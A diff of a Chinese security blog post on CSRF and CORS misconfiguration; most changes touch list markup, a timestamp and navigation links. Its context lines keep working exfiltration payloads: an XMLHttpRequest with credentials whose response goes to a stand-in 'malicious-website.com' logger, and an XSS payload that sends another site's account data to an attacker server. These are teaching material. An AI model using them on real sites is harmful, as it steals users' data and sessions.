@@ -29,7 +29,7 @@
 <meta property="og:image" content="https://i4g5d.github.io/2025/10/30/CSRF/image-20251030203425958.png">
 <meta property="og:image" content="https://i4g5d.github.io/2025/10/30/CSRF/image-20251030195714203.png">
 <meta property="article:published_time" content="2025-10-30T06:13:14.000Z">
-<meta property="article:modified_time" content="2025-10-30T12:36:42.496Z">
+<meta property="article:modified_time" content="2025-11-01T10:49:53.242Z">
 <meta property="article:author" content="i4G5d">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://i4g5d.github.io/2025/10/30/CSRF/image-20251030203425958.png">
@@ -331,10 +331,8 @@
 
 <p>这种情况下很危险,随意就能绕过SOP,获得回显,</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> req = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>req.<span class="hljs-property">onload</span> = reqListener;<br>req.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;get&#x27;</span>,<span class="hljs-string">&#x27;https://要窃取的网站/sensitive-victim-data&#x27;</span>,<span class="hljs-literal">true</span>);<br>req.<span class="hljs-property">withCredentials</span> = <span class="hljs-literal">true</span>;<br>req.<span class="hljs-title function_">send</span>();<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">reqListener</span>(<span class="hljs-params"></span>) &#123;<br>	location=<span class="hljs-string">&#x27;//malicious-website.com/log?key=&#x27;</span>+<span class="hljs-variable language_">this</span>.<span class="hljs-property">responseText</span>;<br>&#125;;<br></code></pre></td></tr></table></figure>
-
-<ol start="2">
-<li>Origin白名单问题设置</li>
-</ol>
+</li>
+<li><p>Origin白名单问题设置  </p>
 <p>一些支持多源访问的网站通过白名单比较,这其中可能产生的情况就是</p>
 <ul>
 <li><p>简单前后缀匹配绕过</p>
@@ -347,9 +345,8 @@
 <p>使用 <code>iframe</code>的<code>sandbox</code> 属性可以产生空源请求。从 <code>iframe</code> 进行请求，需要使用绝对路径将日志写入攻击者服务器</p>
 </li>
 </ul>
-<ol start="3">
-<li>即使配置已经严格,但假设信任的源存在XSS,利用 XSS 仍能通过跨源资源请求窃取敏感数据</li>
-</ol>
+</li>
+<li><p>即使配置已经严格,但假设信任的源存在XSS,利用 XSS 仍能通过跨源资源请求窃取敏感数据</p>
 <p>例如<code>a.com</code>只信任<code>b.com</code>,a允许b获取信息,但<code>b.com</code>存在XSS.</p>
 <p>那么攻击者就可以利用 XSS 在当前发起对 a 网站的跨源资源请求</p>
 <p>把xss的alert换成下面的<code>payload</code>(fetch写法),就能往攻击者服务器发送cookie</p>
@@ -357,10 +354,8 @@
 
 <p>所以如果受害者点击(xHR写法)(如果b可以被很多源访问,就达成了借B杀A)</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">&quot;https://b/?xss=&lt;script&gt;var req = new XMLHttpRequest(); req.onload = reqListener; req.open(&#x27;get&#x27;,&#x27;https://a/accountDetails&#x27;,true); req.withCredentials = true;req.send();function reqListener() &#123;location=&#x27;https://攻击者服务器/log?key=&#x27;%2bthis.responseText; &#125;;%3c/script&gt;&quot;</span><br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
-
-<ol start="4">
-<li>防御</li>
-</ol>
+</li>
+<li><p>防御</p>
 <p>所以防止也很简单,就是严格的限制白名单,避免NULL</p>
 </li>
 </ol>
@@ -385,7 +380,7 @@
 <p>​    浏览器不会在任何跨站点请求中发送该 Cookie。简单来说，这意味着，如果请求的目标站点与浏览器地址栏中当前显示的站点不匹配，则它将不包含 Cookie。</p>
 </li>
 <li><p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#lax"><code>Lax</code> <code>宽松</code></a></p>
-<pre><code class="hljs"> 意味着浏览器将在跨站点请求中发送 Cookie，但前提是同时满足以下两个条件：
+<pre><code class="hljs">意味着浏览器将在跨站点请求中发送 Cookie，但前提是同时满足以下两个条件：
 </code></pre>
 <ul>
 <li>该请求使用 <code>GET</code> 方法。</li>
@@ -559,12 +554,18 @@
                   <article class="post-prev col-6">
                     
                     
+                      <a href="/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/" title="HTTP1请求走私">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HTTP1请求走私</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/10/28/HTTP-HOST-header-attacks/" title="HTTP_Host_header_attacks">
-                        <span class="hidden-mobile">HTTP_Host_header_attacks</span>
+                      <a href="/2025/10/28/HTTP%E4%B8%BB%E6%9C%BA%E5%A4%B4%E6%94%BB%E5%87%BB/" title="HTTP请求头攻击">
+                        <span class="hidden-mobile">HTTP请求头攻击</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
